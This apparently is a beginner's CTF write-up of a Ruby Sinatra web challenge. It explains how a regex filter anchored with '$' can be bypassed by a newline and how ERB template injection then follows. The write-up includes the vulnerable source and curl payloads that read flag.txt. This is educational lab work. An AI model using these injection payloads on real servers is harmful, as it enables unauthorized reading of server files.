It’s quite a simple, beginner friendly CTF.Manual AnalysisChecking Available SubpagesConsidering that vulnerability scanning tools were 0 help, I manually start checking the website.After entering it for the first time, I realize that the index page is the only one accessible by the user, and there’s user input so my brain instantly thinks XSS.Attempting XSSAfter attempting a few basic testing scripts such as:&lt;script&gt;alert(1)&lt;/script&gt;We get a notification: “Malicious input detected”.ConclusionSo now we know there’s some type of a regex/parser that detects us.The no.1 thing I learned when it comes to web is that 80% of challenges can be solved by going through the source code so that is what I didSource CodeSo going through the source code I stumbled upon a file called “neon.rb”.class NeonControllers &lt; Sinatra::Base configure do set :views, \"app/views\" set :public_dir, \"public\" end get '/' do @neon = \"Glow With The Flow\" erb :'index' end post '/' do if params[:neon] =~ /^[0-9a-z ]+$/i @neon = ERB.new(params[:neon]).result(binding) else @neon = \"Malicious Input Detected\" end erb :'index' endendLooking through it we see there’s some type of regex inside allowing only characters 0-9, a-z and spaces. Anything else will throw a “Malicious Input Detected”.So now we know we have to somehow bypass this regex, but how?We also see in the files that theres a flag.txt file telling us that the flag is hidden under the /flag part of the page, sadly… it’s not accessible by plainly putting it in the browser.ResearchRuby RegexSo by the power of google, I found out that using “$” in a Ruby regex is not the smartest idea. This is because it can be bypassed by using a newline. Stack overflow was my friend here… original post.ERBIf we go back to the source code, we see a function ERB.new() getting called if the regex conditions are met, so I have to check what this is, in order to know what to do after bypassing the regex.I found this post, so feel free to refer to it hereThis post helped me understand basically what ERB is, it’s a templating system, allowing Ruby code to be added to a document for generating flow controls, document info. etc.On the same post I found these ruby rules:&lt;% Ruby code -- inline with output %&gt;&lt;%= Ruby expression -- replace with result %&gt;&lt;%# comment -- ignored -- useful in testing %&gt;% a line of Ruby code -- treated as &lt;% line %&gt; (optional -- see ERB.new)%% replaced with % if first thing on a line and % processing is used&lt;%% or %%&gt; -- replace with &lt;% or %&gt; respectivelyExploitationFor all requests sent, I used curl, it was simpler for me, but Burp can be used as well. In this case it’s personal preference.curl -d 'payload'Attempt 1After googling for some time I found a function for ruby called File.open(‘flag.txt’), but putting in a payload in did not work.curl -d 'neon=lmao%3C%25%3DFile.open%28%22flag.txt%29%25%3E' 178.62.40.59:32062Attempt 2After a bit more of googling I found that if I want ruby to return my output I have to use the .read functioncurl -d 'neon=lmao%3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E' 157.245.33.77:30719And so… boom we have the flag!flag: HTB{f4k3_fl4g_f0r_t3st1ng}Yes, you will have to run it on your own, I will not make it too easy.Closing StatementThis was quite an interesting challenge, especially due to me not being too experienced with Ruby or anything connected to it. Yes, I had quite a trouble googling on how to exploit this but it paid off at the end.Thank you for reading my writeup." } ]
